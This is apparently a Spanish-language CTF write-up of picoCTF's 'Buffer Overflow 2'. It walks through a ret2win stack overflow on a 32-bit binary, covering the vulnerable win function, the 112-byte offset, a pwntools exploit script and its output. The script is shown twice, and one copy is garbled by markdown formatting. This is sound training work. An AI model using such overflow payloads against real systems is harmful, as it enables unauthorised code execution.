# Buffer Overflow 2

```bash
file vuln  
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped  
```

```bash
checksec --file=vuln  
RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY FortifiedFortifiable FILE  
Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 77 Symbols No 0 3 vuln  
```

Este reto es un Ret2Win simple como el ejercicio anterior “buffer overflow 1”, pero requiere que la función a la que queremos llegar tenga 2 argumentos con un cierto valor para que imprima la flag.

```c
void win(unsigned int arg1, unsigned int arg2) {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt", "r");

    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }
    fgets(buf, FLAGSIZE, f);

    if (arg1 != 0xCAFEF00D)
        return;

    if (arg2 != 0xF00DF00D)
        return;

    printf(buf);
}
```

Podemos aprovechar el script anterior, cambiando el offset al del nuevo binario y pasándole como argumentos esas 2 direcciones. Como el binario es x86 podemos simplemente lanzarle los argumentos después de la dirección de retorno.

```c
EIP 0x62616164 ('daab')  
```

```c
Found at offset 112  
```

Vamos a crear el script:

```python
[from pwn import *  
exe = ELF("./vuln_patched")  
context.binary = exe

def conn():  
if args.LOCAL:  
r = process([exe.path])  
if args.DEBUG:  
gdb.attach(r)  
else:  
r = remote("saturn.picoctf.net", 61001)  
return r

def main():  
r = conn()  
padding = 112
payload = flat({  
    padding: [  
        exe.symbols.win,  
        0x0, # Dirección de retorno  
        0xCAFEF00D, # Argumento 1  
        0xF00DF00D # Argumento 2  
    ]  
})  
r.sendline(payload)  
r.interactive()  
if **name** == "**main**":  
main()](<from pwn import *

exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 61001)
    return r

def main():
    r = conn()
    padding = 112
    payload = flat({
        padding: [
            exe.symbols.win,
            0x0,         # Dirección de retorno
            0xCAFEF00D,  # Argumento 1
            0xF00DF00D   # Argumento 2
        ]
    })
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()>)
```

¡Funciona!

```bash
python solve.py  
[_] '/home/ub1cu0/Desktop/picoCTF/buffer_overflow_2/vuln_patched'  
Arch: i386-32-little  
RELRO: Partial RELRO  
Stack: No canary found  
NX: NX enabled  
PIE: No PIE (0x8048000)  
SHSTK: Enabled  
IBT: Enabled  
Stripped: No  
[+] Opening connection to saturn.picoctf.net on port 54392: Done  
[_] Switching to interactive mode  
Please enter your string:  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08  
picoCTF{SECRETO}  
[*] Got EOF while reading in interactive  
```
